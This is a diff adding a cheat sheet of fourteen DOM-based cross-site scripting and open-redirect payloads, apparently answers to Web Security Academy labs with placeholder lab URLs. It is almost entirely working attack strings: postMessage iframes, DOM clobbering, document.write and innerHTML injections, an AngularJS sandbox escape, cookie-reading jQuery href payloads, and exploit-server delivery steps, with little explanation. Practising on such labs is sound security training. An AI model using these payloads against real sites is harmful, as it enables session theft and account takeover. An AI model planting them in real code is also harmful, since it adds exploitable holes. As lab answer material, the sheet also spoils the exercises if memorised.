@@ -1,0 +1,61 @@
+// dom xss test scripts
+
+1.DOM XSS using web messages
+
+<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+
+2. DOM XSS using web messages and a JavaScript URL
+
+<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+
+3. DOM XSS using web messages and JSON.parse
+
+<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
+4. DOM-based open redirection
+
+https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/
+
+5. DOM-based cookie manipulation
+
+<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
+
+6. Exploiting DOM clobbering to enable XSS
+
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+
+7. Clobbering DOM attributes to bypass HTML filters
+
+Go to one of the blog posts and create a comment containing the following HTML:
+<form id=x tabindex=0 onfocus=print()><input id=attributes>
+Go to the exploit server and add the following iframe to the body:
+<iframe src=https://your-lab-id.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">. Remember to change the URL to contain your lab ID and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step.
+Store the exploit and deliver it to the victim. The next time the page loads, the print() function is called.
+
+8. DOM XSS in document.write sink using source location.search
+
+"><svg onload=alert(1)>
+
+9. DOM XSS in document.write sink using source location.search inside a select element
+
+"></select><img%20src=1%20onerror=alert(1)>
+
+10. DOM XSS in innerHTML sink using source location.search
+
+<img src=1 onerror=alert(1)>
+
+11. DOM XSS in jQuery anchor href attribute sink using location.search source
+
+javascript:alert(document.cookie)
+
+12. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+{{$on.constructor('alert(1)')()}}
+
+13. Reflected DOM XSS
+
+\"-alert(1)}//
+
+14. Stored DOM XSS
+
+<><img src=1 onerror=alert(1)>
